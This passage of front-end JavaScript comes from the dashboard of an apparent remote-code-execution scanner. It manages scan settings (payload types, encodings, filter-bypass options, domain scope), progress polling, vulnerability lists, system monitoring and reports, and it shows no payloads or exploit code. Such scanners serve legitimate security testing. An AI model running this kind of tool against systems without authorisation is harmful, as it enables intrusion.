        setElementValue('outputDir', defaultScanSettings.output_dir);
        
        setElementValue('targetOS', defaultScanSettings.target_os);
        
        document.querySelectorAll('input[name="techStack"]').forEach(function(cb) {
            cb.checked = defaultScanSettings.tech_stack.indexOf(cb.value) !== -1;
        });
        
        document.querySelectorAll('input[name="payloadType"]').forEach(function(cb) {
            cb.checked = defaultScanSettings.payload_types.indexOf(cb.value) !== -1;
        });
        
        document.querySelectorAll('input[name="encoding"]').forEach(function(cb) {
            cb.checked = defaultScanSettings.encodings.indexOf(cb.value) !== -1;
        });
        
        document.querySelectorAll('input[name="bypass"]').forEach(function(cb) {
            cb.checked = false;
        });
        
        setElementValue('customPayloads', '');
        setElementValue('customWordlist', '');
        
        setElementValue('allowDomains', '');
        setElementValue('blockDomains', '');
        setElementChecked('optRestrictRoot', true);
        
        var progressSection = document.getElementById('progressSection');
        if (progressSection) progressSection.style.display = 'none';
        
        localStorage.removeItem('rce_hawkeye_settings');
        
        showNotification(safeT('settings.settingsReset', 'Settings reset to defaults'), 'success');
    } catch (e) {
        console.error('Reset settings error:', e);
        showNotification('Error resetting settings: ' + e.message, 'error');
    }
}

function saveScanSettings() {
    try {
        var config = getScanConfig();
        
        var settingsToSave = {
            scan_level: config.scan_level,
            scan_mode: config.scan_mode,
            concurrent: config.concurrent,
            timeout: config.timeout,
            delay_threshold: config.delay_threshold,
            crawl: config.crawl,
            dir_scan: config.dir_scan,
            param_fuzz: config.param_fuzz,
            smart_dict: config.smart_dict,
            include_response: config.include_response,
            verify_ssl: config.verify_ssl,
            prefer_https: config.prefer_https,
            method: config.method,
            crawl_depth: config.crawl_depth,
            crawl_pages: config.crawl_pages,
            dir_threads: config.dir_threads,
            dir_filter_status: config.dir_filter_status,
            target_os: config.target_os,
            tech_stack: config.tech_stack || [],
            payload_types: config.payload_types || [],
            encodings: config.encodings || [],
            bypass_techniques: config.bypass_techniques || []
        };
        
        localStorage.setItem('rce_hawkeye_settings', JSON.stringify(settingsToSave));
        showNotification('Settings saved successfully', 'success');
    } catch (e) {
        console.error('Failed to save settings:', e);
        showNotification('Failed to save settings: ' + e.message, 'error');
    }
}

function loadScanSettings() {
    try {
        var saved = localStorage.getItem('rce_hawkeye_settings');
        if (!saved) return;
        
        var settings = JSON.parse(saved);
        
        function setVal(id, val) {
            var el = document.getElementById(id);
            if (el && val !== undefined && val !== null) el.value = val;
        }
        function setChecked(id, val) {
            var el = document.getElementById(id);
            if (el && val !== undefined) el.checked = val;
        }
        
        setVal('scanLevel', settings.scan_level);
        setVal('scanMode', settings.scan_mode);
        setVal('concurrent', settings.concurrent);
        setVal('timeout', settings.timeout);
        setVal('delayThreshold', settings.delay_threshold);
        
        setChecked('optCrawl', settings.crawl);
        setChecked('optDirScan', settings.dir_scan);
        setChecked('optParamFuzz', settings.param_fuzz);
        setChecked('optSmartDict', settings.smart_dict);
        setChecked('optIncludeResponse', settings.include_response);
        setChecked('optVerifySSL', settings.verify_ssl);
        setChecked('optPreferHTTPS', settings.prefer_https);
        
        setVal('httpMethod', settings.method || settings.http_method);
        setVal('crawlDepth', settings.crawl_depth);
        setVal('crawlPages', settings.crawl_pages);
        setVal('dirThreads', settings.dir_threads);
        setVal('dirFilterStatus', settings.dir_filter_status);
        setVal('targetOS', settings.target_os);
        
        if (settings.tech_stack && Array.isArray(settings.tech_stack)) {
            document.querySelectorAll('input[name="techStack"]').forEach(function(cb) {
                cb.checked = settings.tech_stack.indexOf(cb.value) !== -1;
            });
        }
        
        if (settings.payload_types && Array.isArray(settings.payload_types)) {
            document.querySelectorAll('input[name="payloadType"]').forEach(function(cb) {
                cb.checked = settings.payload_types.indexOf(cb.value) !== -1;
            });
        }
        
        if (settings.encodings && Array.isArray(settings.encodings)) {
            document.querySelectorAll('input[name="encoding"]').forEach(function(cb) {
                cb.checked = settings.encodings.indexOf(cb.value) !== -1;
            });
        }
        
        if (settings.bypass_techniques && Array.isArray(settings.bypass_techniques)) {
            document.querySelectorAll('input[name="bypass"]').forEach(function(cb) {
                cb.checked = settings.bypass_techniques.indexOf(cb.value) !== -1;
            });
        }
    } catch (e) {
        console.error('Failed to load settings:', e);
    }
}

function showNotification(message, type) {
    var notification = document.createElement('div');
    notification.className = 'notification ' + (type || 'info');
    notification.innerHTML = '<span>' + message + '</span><button onclick="this.parentElement.remove()" style="background:none;border:none;color:white;cursor:pointer;font-size:18px;">&times;</button>';
    notification.style.cssText = 'position: fixed; top: 20px; right: 20px; padding: 12px 20px; background: ' + 
        (type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#06b6d4') + 
        '; color: white; border-radius: 8px; z-index: 10000; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.3);';
    
    document.body.appendChild(notification);
    
    setTimeout(function() {
        if (notification.parentElement) {
            notification.remove();
        }
    }, 3000);
}

function resetScanForm() {
    document.getElementById('targetUrl').value = '';
    document.getElementById('urlFile').value = '';
    document.getElementById('allowDomains').value = '';
    document.getElementById('blockDomains').value = '';
    document.getElementById('scanLevel').value = '2';
    document.getElementById('scanMode').value = 'echo';
    document.getElementById('concurrent').value = '10';
    document.getElementById('timeout').value = '10';
    document.getElementById('delayThreshold').value = '4';
    document.getElementById('retries').value = '2';
    document.getElementById('optCrawl').checked = false;
    document.getElementById('optDirScan').checked = true;
    document.getElementById('optParamFuzz').checked = true;
    document.getElementById('optSmartDict').checked = true;
    document.getElementById('optIncludeResponse').checked = false;
    document.getElementById('optVerifySSL').checked = false;
    document.getElementById('optRestrictRoot').checked = true;
    document.getElementById('optFollowRedirect').checked = true;
    document.getElementById('optAutoDetect').checked = false;
}

function parseTargetUrl() {
    var url = document.getElementById('targetUrl').value;
    if (!url) {
        return;
    }
    
    try {
        var parsed = new URL(url);
        var domain = parsed.hostname;
        var allowDomains = document.getElementById('allowDomains');
        if (allowDomains && !allowDomains.value) {
            allowDomains.value = domain;
        }
        addScanLog('info', '[INFO] Parsed URL: domain=' + domain + ', path=' + parsed.pathname);
    } catch (e) {
        addScanLog('warning', '[WARN] Invalid URL format');
    }
}

async function startScan() {
    var config = getScanConfig();
    
    if (!config.url && (!config.urls || config.urls.length === 0) && !config.raw_traffic) {
        alert(safeT('scan.targetRequired', 'Please enter a target URL, URLs file, or traffic file'));
        return;
    }
    
    var btn = document.getElementById('startScanBtn');
    btn.disabled = true;
    btn.innerHTML = '<span class="loading-spinner"></span><span>' + safeT('scan.starting', 'Starting...') + '</span>';
    
    clearScanLog();
    addScanLog('info', '[INFO] Starting scan...');
    
    try {
        var response = await fetch('/api/scan', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(config)
        });
        
        var data = await response.json();
        
        if (data.success) {
            currentScanId = data.scan_id;
            addScanLog('success', '[OK] Scan started with ID: ' + data.scan_id);
            var progressSection = document.getElementById('progressSection');
            if (progressSection) progressSection.style.display = 'block';
            startProgressRefresh();
        } else {
            addScanLog('error', '[ERROR] ' + data.error);
            alert('Error: ' + data.error);
            btn.disabled = false;
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg><span>' + safeT('scan.startScan', 'Start Scan') + '</span>';
        }
    } catch (error) {
        addScanLog('error', '[ERROR] Failed to start scan: ' + error.message);
        alert('Failed to start scan: ' + error.message);
        btn.disabled = false;
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg><span>' + safeT('scan.startScan', 'Start Scan') + '</span>';
    }
}

function addScanLog(type, message) {
    var terminal = document.getElementById('scanTerminal');
    if (!terminal) return;
    
    var line = document.createElement('div');
    line.className = 'terminal-line ' + type;
    var timestamp = new Date().toLocaleTimeString();
    line.textContent = '[' + timestamp + '] ' + message;
    terminal.appendChild(line);
    terminal.scrollTop = terminal.scrollHeight;
    
    var maxLines = 500;
    while (terminal.children.length > maxLines) {
        terminal.removeChild(terminal.firstChild);
    }
}

function clearScanLog() {
    var terminal = document.getElementById('scanTerminal');
    if (terminal) {
        terminal.innerHTML = '<div class="terminal-line info">[INFO] Ready to scan...</div>';
    }
}

function startProgressRefresh() {
    if (refreshInterval) {
        clearInterval(refreshInterval);
    }
    
    var lastTask = '';
    var lastVulnCount = 0;
    var lastExtra = null;
    var logCount = 0;
    var maxLogsPerScan = 200;
    
    refreshInterval = setInterval(async function() {
        if (!currentScanId) {
            clearInterval(refreshInterval);
            return;
        }
        
        try {
            var response = await fetch('/api/status/' + currentScanId);
            var data = await response.json();
            
            if (data.success) {
                var statusData = data;
                
                updateProgress(statusData);
                
                var extra = statusData.extra || {};
                var phase = extra.phase || '';
                
                if (phase === 'response' && logCount < maxLogsPerScan) {
                    var param = extra.param || '';
                    var method = extra.method || '';
                    var payload = extra.payload || '';
                    var respLen = extra.resp_len || 0;
                    var found = extra.found || false;
                    
                    if (found) {
                        addScanLog('warning', '[VULN] ' + method + ' ' + param + '=' + payload + ' (matched!)');
                    } else if (logCount % 10 === 0) {
                        addScanLog('info', '[SCAN] ' + method + ' ' + param + '=' + payload.substring(0, 20) + '... (len:' + respLen + ')');
                    }
                    logCount++;
                } else if (phase === 'start') {
                    var params = extra.params || 0;
                    var payloads = extra.payloads || 0;
                    addScanLog('info', '[INFO] Starting scan with ' + params + ' params, ' + payloads + ' payloads');
                } else if (phase === 'tasks_created') {
                    var taskCount = extra.task_count || 0;
                    addScanLog('info', '[INFO] Created ' + taskCount + ' scan tasks');
                } else if (phase === 'payloads_final') {
                    var count = extra.count || 0;
                    addScanLog('info', '[INFO] Loaded ' + count + ' payloads');
                }
                
                if (statusData.vuln_count !== undefined && statusData.vuln_count > lastVulnCount) {
                    var newVulns = statusData.vuln_count - lastVulnCount;
                    addScanLog('warning', '[VULN] Found ' + newVulns + ' new vulnerability(s)! Total: ' + statusData.vuln_count);
                    lastVulnCount = statusData.vuln_count;
                }
                
                var scanStatus = statusData.status || '';
                
                if (scanStatus === 'completed' || scanStatus === 'Completed') {
                    clearInterval(refreshInterval);
                    addScanLog('success', '[OK] Scan completed! Found ' + (statusData.vuln_count || 0) + ' vulnerability(s)');
                    var btn = document.getElementById('startScanBtn');
                    if (btn) {
                        btn.disabled = false;
                        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg><span>' + safeT('scan.startScan', 'Start Scan') + '</span>';
                    }
                    loadStats();
                    loadHistory();
                    
                    if (statusData.vulns && statusData.vulns.length > 0) {
                        displayVulnerabilities(statusData.vulns);
                    }
                } else if (scanStatus === 'error' || scanStatus === 'Error') {
                    clearInterval(refreshInterval);
                    addScanLog('error', '[ERROR] Scan failed: ' + (data.status.error || 'Unknown error'));
                    var btn = document.getElementById('startScanBtn');
                    if (btn) {
                        btn.disabled = false;
                        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg><span>' + safeT('scan.startScan', 'Start Scan') + '</span>';
                    }
                } else if (scanStatus === 'stopped' || scanStatus === 'Stopped') {
                    clearInterval(refreshInterval);
                    addScanLog('warning', '[WARN] Scan was stopped');
                    var btn = document.getElementById('startScanBtn');
                    if (btn) {
                        btn.disabled = false;
                        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg><span>' + safeT('scan.startScan', 'Start Scan') + '</span>';
                    }
                }
            }
        } catch (error) {
            console.error('Failed to refresh progress:', error);
        }
    }, 500);
}

function updateProgress(status) {
    var progressBar = document.getElementById('progressBar');
    var progressStatus = document.getElementById('progressStatus');
    var progressPercent = document.getElementById('progressPercent');
    var progressDetail = document.getElementById('progressDetail');
    
    var progress = Math.min(Math.max(status.progress || 0, 0), 100);
    
    if (progressBar) progressBar.style.width = progress + '%';
    if (progressPercent) progressPercent.textContent = progress + '%';
    
    var statusText = status.current_task || '';
    var scanStatus = status.status || '';
    
    if (scanStatus === 'completed' || scanStatus === 'Completed') {
        statusText = safeT('scan.completed', 'Scan Completed');
    } else if (scanStatus === 'error' || scanStatus === 'Error') {
        statusText = safeT('scan.error', 'Scan Error');
    } else if (scanStatus === 'stopped' || scanStatus === 'Stopped') {
        statusText = safeT('scan.stopped', 'Scan Stopped');
    }
    
    if (progressStatus) {
        progressStatus.textContent = statusText;
    }
    
    if (progressDetail) {
        var detailHtml = '';
        if (status.scanned !== undefined && status.total_targets !== undefined && status.total_targets > 0) {
            detailHtml += '<div class="progress-stat"><span>' + safeT('scan.progress', 'Progress') + ':</span> <span>' + status.scanned + '/' + status.total_targets + '</span></div>';
        }
        if (status.vuln_count !== undefined) {
            detailHtml += '<div class="progress-stat"><span>' + safeT('scan.vulnsFound', 'Vulnerabilities Found') + ':</span> <span class="vuln-count">' + status.vuln_count + '</span></div>';
        }
        progressDetail.innerHTML = detailHtml;
    }
}

function displayVulnerabilities(vulns) {
    var list = document.getElementById('vulnerabilityList');
    
    if (!list) return;
    
    if (!vulns || vulns.length === 0) {
        list.innerHTML = '<div class="empty-state"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg><p>' + safeT('results.noResults', 'No results') + '</p></div>';
        return;
    }
    
    var html = '';
    vulns.forEach(function(v) {
        var severityClass = (v.severity || 'medium').toLowerCase();
        html += '<div class="vuln-item ' + severityClass + '">' +
            '<div class="vuln-header">' +
            '<span class="vuln-target">' + escapeHtml(v.target) + '</span>' +
            '<span class="vuln-severity ' + severityClass + '">' + (v.severity || 'Medium') + '</span>' +
            '</div>' +
            '<div class="vuln-param">Parameter: ' + escapeHtml(v.parameter) + '</div>' +
            '<div class="vuln-payload">' + escapeHtml(v.payload) + '</div>' +
            '</div>';
    });
    
    list.innerHTML = html;
}

async function loadStats() {
    try {
        var response = await fetch('/api/stats');
        var data = await response.json();
        
        if (data.success) {
            var totalScans = document.getElementById('totalScans');
            var criticalVulns = document.getElementById('criticalVulns');
            var highVulns = document.getElementById('highVulns');
            var targetsScanned = document.getElementById('targetsScanned');
            
            if (totalScans) totalScans.textContent = data.total_scans || 0;
            if (criticalVulns) criticalVulns.textContent = data.critical_vulns || 0;
            if (highVulns) highVulns.textContent = data.high_vulns || 0;
            if (targetsScanned) targetsScanned.textContent = data.targets_scanned || 0;
            
            if (vulnChart) {
                vulnChart.data.datasets[0].data = [
                    data.critical_vulns || 0,
                    data.high_vulns || 0,
                    data.medium_vulns || 0,
                    data.low_vulns || 0
                ];
                vulnChart.update('none');
            }
        }
    } catch (error) {
        console.error('Failed to load stats:', error);
    }
}

async function loadSystemStatus() {
    try {
        var response = await fetch('/api/monitor');
        var data = await response.json();
        
        if (data.success) {
            var system = data.system || {};
            
            var statusCpu = document.getElementById('statusCpu');
            var statusMemory = document.getElementById('statusMemory');
            var statusGoroutines = document.getElementById('statusGoroutines');
            var statusHeap = document.getElementById('statusHeap');
            var statusCpuCores = document.getElementById('statusCpuCores');
            var statusGoVersion = document.getElementById('statusGoVersion');
            var cpuBar = document.getElementById('cpuBar');
            var memoryBar = document.getElementById('memoryBar');
            var goroutineBar = document.getElementById('goroutineBar');
            var heapBar = document.getElementById('heapBar');
            
            var memoryMB = system.memory_mb || 0;
            var goroutines = system.goroutines || 0;
            var cpuUsage = system.cpu_usage || 0;
            var heapMB = system.heap_mb || 0;
            
            if (statusCpu) statusCpu.textContent = cpuUsage + '%';
            if (statusMemory) statusMemory.textContent = memoryMB + ' MB';
            if (statusGoroutines) statusGoroutines.textContent = goroutines;
            if (statusHeap) statusHeap.textContent = heapMB + ' MB';
            if (statusCpuCores) statusCpuCores.textContent = system.cpu_cores || 0;
            if (statusGoVersion) statusGoVersion.textContent = system.go_version || '-';
            
            if (cpuBar) cpuBar.style.width = Math.min(cpuUsage, 100) + '%';
            if (memoryBar) memoryBar.style.width = Math.min(memoryMB / 2, 100) + '%';
            if (goroutineBar) goroutineBar.style.width = Math.min(goroutines * 2, 100) + '%';
            if (heapBar) heapBar.style.width = Math.min(heapMB, 100) + '%';
        }
    } catch (error) {
        console.error('Failed to load system status:', error);
    }
}

function startMonitorRefresh() {
    if (monitorInterval) {
        clearInterval(monitorInterval);
    }
    
    loadMonitor();
    monitorInterval = setInterval(loadMonitor, 5000);
}

function stopMonitorRefresh() {
    if (monitorInterval) {
        clearInterval(monitorInterval);
        monitorInterval = null;
    }
}

async function loadMonitor() {
    try {
        var response = await fetch('/api/monitor');
        var data = await response.json();
        
        if (data.success) {
            var system = data.system || {};
            var vulns = data.vulnerabilities || {};
            
            var monitorCpuUsage = document.getElementById('monitorCpuUsage');
            var monitorGoroutines = document.getElementById('monitorGoroutines');
            var monitorMemory = document.getElementById('monitorMemory');
            var monitorNetworkIO = document.getElementById('monitorNetworkIO');
            var monitorHeapAlloc = document.getElementById('monitorHeapAlloc');
            var monitorStackInuse = document.getElementById('monitorStackInuse');
            var monitorGCPause = document.getElementById('monitorGCPause');
            var monitorVulns = document.getElementById('monitorVulns');
            
            var cpuUsage = system.cpu_usage || 0;
            var memoryMB = system.memory_mb || 0;
            var heapMB = system.heap_mb || 0;
            var networkKB = system.network_io_kb || 0;
            
            if (monitorCpuUsage) monitorCpuUsage.textContent = cpuUsage + '%';
            if (monitorGoroutines) monitorGoroutines.textContent = system.goroutines || 0;
            if (monitorMemory) monitorMemory.textContent = memoryMB + ' MB';
            if (monitorNetworkIO) monitorNetworkIO.textContent = networkKB + ' KB/s';
            if (monitorHeapAlloc) monitorHeapAlloc.textContent = heapMB + ' MB';
            if (monitorStackInuse) monitorStackInuse.textContent = (system.stack_mb || 0) + ' MB';
            if (monitorGCPause) monitorGCPause.textContent = (system.gc_pause_ms || 0) + ' ms';
            if (monitorVulns) monitorVulns.textContent = vulns.total || 0;
            
            var cpuBar = document.getElementById('cpuBar');
            var memoryBar = document.getElementById('memoryBar');
            if (cpuBar) {
                cpuBar.style.width = cpuUsage + '%';
                cpuBar.className = 'bar-fill ' + (cpuUsage > 80 ? 'red' : cpuUsage > 60 ? 'yellow' : 'green');
            }
            if (memoryBar) {
                var memPercent = Math.min(100, (memoryMB / 1024) * 100);
                memoryBar.style.width = memPercent + '%';
                memoryBar.className = 'bar-fill ' + (memPercent > 80 ? 'red' : memPercent > 60 ? 'yellow' : 'cyan');
            }
            
            updateGauges(cpuUsage, memoryMB, heapMB, networkKB);
            
            updateTrendCharts(cpuUsage, memoryMB, system.goroutines || 0, heapMB, system.gc_pause_ms || 0, networkKB);
        }
    } catch (error) {
        console.error('Failed to load monitor:', error);
    }
}

function updateGauges(cpu, memory, heap, network) {
    var maxMemory = 1024;
    var maxHeap = 512;
    var maxNetwork = 1000;
    
    if (cpuGaugeChart) {
        cpuGaugeChart.data.datasets[0].data = [cpu, 100 - cpu];
        cpuGaugeChart.update('none');
        var cpuGaugeValue = document.getElementById('cpuGaugeValue');
        if (cpuGaugeValue) cpuGaugeValue.textContent = cpu + '%';
    }
    
    if (memoryGaugeChart) {
        var memPercent = Math.min(100, (memory / maxMemory) * 100);
        memoryGaugeChart.data.datasets[0].data = [memPercent, 100 - memPercent];
        memoryGaugeChart.update('none');
        var memoryGaugeValue = document.getElementById('memoryGaugeValue');
        if (memoryGaugeValue) memoryGaugeValue.textContent = Math.round(memPercent) + '%';
    }
    
    if (heapGaugeChart) {
        var heapPercent = Math.min(100, (heap / maxHeap) * 100);
        heapGaugeChart.data.datasets[0].data = [heapPercent, 100 - heapPercent];
        heapGaugeChart.update('none');
        var heapGaugeValue = document.getElementById('heapGaugeValue');
        if (heapGaugeValue) heapGaugeValue.textContent = Math.round(heapPercent) + '%';
    }
    
    if (networkGaugeChart) {
        var netPercent = Math.min(100, (network / maxNetwork) * 100);
        networkGaugeChart.data.datasets[0].data = [netPercent, 100 - netPercent];
        networkGaugeChart.update('none');
        var networkGaugeValue = document.getElementById('networkGaugeValue');
        if (networkGaugeValue) networkGaugeValue.textContent = network + ' KB/s';
    }
}

var trendData = {
    cpu: [], memory: [], goroutines: [], heap: [], gc: [], networkTx: [], networkRx: [], labels: []
};
var maxTrendPoints = 60;

function updateTrendCharts(cpu, memory, goroutines, heap, gc, network) {
    var now = new Date();
    var label = now.getHours() + ':' + String(now.getMinutes()).padStart(2, '0') + ':' + String(now.getSeconds()).padStart(2, '0');
    
    trendData.labels.push(label);
    trendData.cpu.push(cpu);
    trendData.memory.push(memory);
    trendData.goroutines.push(goroutines);
    trendData.heap.push(heap);
    trendData.gc.push(gc);
    trendData.networkTx.push(network);
    trendData.networkRx.push(network * 0.8);
    
    if (trendData.labels.length > maxTrendPoints) {
        trendData.labels.shift();
        trendData.cpu.shift();
        trendData.memory.shift();
        trendData.goroutines.shift();
        trendData.heap.shift();
        trendData.gc.shift();
        trendData.networkTx.shift();
        trendData.networkRx.shift();
    }
    
    if (cpuChart && currentChartView === 'trend') {
        cpuChart.data.labels = trendData.labels.slice();
        cpuChart.data.datasets[0].data = trendData.cpu.slice();
        cpuChart.update('none');
    }
    
    if (memoryChart && currentChartView === 'trend') {
        memoryChart.data.labels = trendData.labels.slice();
        memoryChart.data.datasets[0].data = trendData.memory.slice();
        memoryChart.update('none');
    }
    
    if (networkChart && currentChartView === 'trend') {
        networkChart.data.labels = trendData.labels.slice();
        networkChart.data.datasets[0].data = trendData.networkTx.slice();
        networkChart.data.datasets[1].data = trendData.networkRx.slice();
        networkChart.update('none');
    }
    
    if (goroutineChart && currentChartView === 'trend') {
        goroutineChart.data.labels = trendData.labels.slice();
        goroutineChart.data.datasets[0].data = trendData.goroutines.slice();
        goroutineChart.update('none');
    }
    
    if (heapChart && currentChartView === 'trend') {
        heapChart.data.labels = trendData.labels.slice();
        heapChart.data.datasets[0].data = trendData.heap.slice();
        heapChart.update('none');
    }
    
    if (gcChart && currentChartView === 'trend') {
        gcChart.data.labels = trendData.labels.slice();
        gcChart.data.datasets[0].data = trendData.gc.slice();
        gcChart.update('none');
    }
}

async function loadReports() {
    try {
        var response = await fetch('/api/reports');
        var data = await response.json();
        
        var list = document.getElementById('reportsList');
        
        if (!list) return;
        
        if (!data.reports || data.reports.length === 0) {
            list.innerHTML = '<p class="text-muted">' + safeT('reports.noReports', 'No reports found') + '</p>';
            return;
        }
        
        var html = '<div class="reports-toolbar">' +
            '<label class="checkbox-label">' +
            '<input type="checkbox" id="selectAllReports" onchange="toggleSelectAllReports()">' +
            '<span>' + safeT('reports.selectAll', 'Select All') + '</span>' +
            '</label>' +
            '<button class="btn-secondary" onclick="deleteSelectedReports()" id="deleteSelectedReportsBtn" style="display:none;">' + safeT('reports.deleteSelected', 'Delete Selected') + '</button>' +
            '</div>' +
            '<div class="reports-list">';
        
        data.reports.forEach(function(r) {
            var sizeKB = Math.round(r.size / 1024);
            var modified = new Date(r.modified).toLocaleString();
            var typeClass = (r.type || 'json').toLowerCase();
            
            html += '<div class="report-item">' +
                '<div class="report-item-header">' +
                '<input type="checkbox" class="report-select" value="' + escapeHtml(r.name) + '" onchange="updateReportSelectedCount()">' +
                '<span class="report-badge ' + typeClass + '">' + (r.type || 'JSON').toUpperCase() + '</span>' +
                '</div>' +
                '<div class="report-item-name">' + escapeHtml(r.name) + '</div>' +
                '<div class="report-item-meta">' +
                '<span>' + sizeKB + ' KB</span>' +
                '<span>' + modified + '</span>' +
                '</div>' +
                '<div class="report-item-actions">' +
                '<a href="/api/reports/' + encodeURIComponent(r.name) + '" target="_blank" class="btn-link">' + safeT('reports.view', 'View') + '</a>' +
                '<a href="/api/reports/' + encodeURIComponent(r.name) + '?download=1" class="btn-link">' + safeT('reports.download', 'Download') + '</a>' +
                '</div>' +
                '</div>';
        });
        
        html += '</div>';
        list.innerHTML = html;
    } catch (error) {
        console.error('Failed to load reports:', error);
    }
}

function toggleSelectAllReports() {
    var selectAll = document.getElementById('selectAllReports');
    var isChecked = selectAll ? selectAll.checked : false;
    document.querySelectorAll('.report-select').forEach(function(cb) {
        cb.checked = isChecked;
    });
    updateReportSelectedCount();
}

function updateReportSelectedCount() {
    var count = document.querySelectorAll('.report-select:checked').length;
    var btn = document.getElementById('deleteSelectedReportsBtn');
    var selectAll = document.getElementById('selectAllReports');
    var total = document.querySelectorAll('.report-select').length;
    
    if (btn) btn.style.display = count > 0 ? 'inline-flex' : 'none';
    if (selectAll) selectAll.checked = count > 0 && count === total;
}

async function deleteSelectedReports() {
    var selectedFiles = [];
    document.querySelectorAll('.report-select:checked').forEach(function(cb) {
        selectedFiles.push(cb.value);
    });
    
    if (selectedFiles.length === 0) {
        alert(safeT('reports.selectFirst', 'Please select reports first'));
        return;
    }
    
    if (!confirm(safeT('reports.confirmDelete', 'Delete selected reports?'))) {
        return;
    }
    
    try {
        var response = await fetch('/api/reports/batch-delete', {
            method: 'POST',
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ files: selectedFiles })
        });
        
        if (response.status === 401) {
            alert(safeT('common.sessionExpired', 'Session expired'));
            window.location.href = '/login';
            return;
        }
        
        var data = await response.json();
        
        if (data.success) {
            alert(safeT('reports.deleteSuccess', 'Reports deleted successfully'));
            loadReports();
        } else {
            alert(safeT('reports.deleteFailed', 'Failed to delete') + ': ' + (data.error || ''));
        }
    } catch (error) {
        alert(safeT('reports.deleteFailed', 'Failed to delete') + ': ' + error.message);
    }
}

async function deleteReport(filename) {
    if (!confirm('Are you sure you want to delete this report?')) {
        return;
    }
    
    try {
        var response = await fetch('/api/reports/delete/' + encodeURIComponent(filename), {
            method: 'POST',
            credentials: 'same-origin'
        });
        
        if (response.status === 401) {
            alert('Session expired, please login again');
            window.location.href = '/login';
            return;
        }
        
        var data = await response.json();
        
        if (data.success) {
            alert('Report deleted successfully');
            loadReports();
        } else {
            alert('Error: ' + (data.error || data.message || 'Delete failed'));
        }
    } catch (error) {
        console.error('Delete report error:', error);
        alert('Delete failed: ' + error.message);
    }
}

async function loadActiveScans() {
    try {
        var response = await fetch('/api/status');
        var data = await response.json();
        
        var list = document.getElementById('activeScansList');
        
        if (!list) return;
        
        if (!data.scans || data.scans.length === 0) {
            list.innerHTML = '<p class="text-muted">' + safeT('common.noData', 'No data') + '</p>';
            return;
        }
        
        var html = '';
        data.scans.forEach(function(s) {
            var statusClass = s.status === 'running' ? 'medium' : s.status === 'completed' ? 'low' : 'high';
            html += '<div class="vuln-item ' + statusClass + '">' +
                '<div class="vuln-header">' +
                '<span class="vuln-target">' + escapeHtml(s.target) + '</span>' +
                '<span class="vuln-severity ' + statusClass + '">' + s.status + '</span>' +
                '</div>' +
                '<div class="progress-bar-container" style="height: 4px; margin-top: 8px;">' +
                '<div class="progress-bar" style="width: ' + s.progress + '%"></div>' +
                '</div>' +
                '<div class="vuln-param" style="margin-top: 6px;">Vulns: ' + (s.vuln_count || 0) + '</div>' +
                '</div>';
        });
        
        list.innerHTML = html;
    } catch (error) {
        console.error('Failed to load active scans:', error);
    }
}

async function loadHistory() {
    console.log('[DEBUG] loadHistory called');
    try {
        var response = await fetch('/api/history');
        var data = await response.json();
        
        console.log('[DEBUG] loadHistory response:', data);
        console.log('[DEBUG] history count:', data.history ? data.history.length : 0);
        
        var list = document.getElementById('historyList');
        
        console.log('[DEBUG] historyList element:', list);
        
        if (!list) {
            console.error('[DEBUG] historyList element not found!');
            return;
        }
        
        if (!data.history || data.history.length === 0) {
            console.log('[DEBUG] No history data');
            list.innerHTML = '<div class="empty-state">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M3 3h18v18H3z"/><path d="M3 9h18"/><path d="M9 21V9"/></svg>' +
                '<p>' + safeT('history.noData', 'No scan history') + '</p>' +
                '<span class="sub-text">' + safeT('history.noDataHint', 'Start a new scan to see results here') + '</span>' +
                '</div>';
            return;
        }
        
        console.log('[DEBUG] Rendering ' + data.history.length + ' history items');
        
        var html = '';
        
        data.history.forEach(function(h) {
            var statusClass = h.status === 'completed' ? 'completed' : h.status === 'running' ? 'running' : 'error';
            var iconClass = h.status === 'completed' ? '' : h.status === 'running' ? 'cyan' : 'red';
            var vulnCountClass = (h.vuln_count || 0) > 0 ? ((h.critical_vulns || 0) > 0 ? 'critical' : '') : '';
            
            html += '<div class="history-item" data-id="' + escapeHtml(h.id) + '">' +
                '<div class="history-checkbox">' +
                '<input type="checkbox" class="history-select" value="' + escapeHtml(h.id) + '">' +
                '</div>' +
                '<div class="history-icon ' + iconClass + '" data-action="detail" data-id="' + escapeHtml(h.id) + '">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>' +
                '</div>' +
                '<div class="history-content" data-action="detail" data-id="' + escapeHtml(h.id) + '">' +
                '<div class="history-target">' + escapeHtml(h.target) + '</div>' +
                '<div class="history-meta">' +
                '<span class="history-meta-item">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>' +
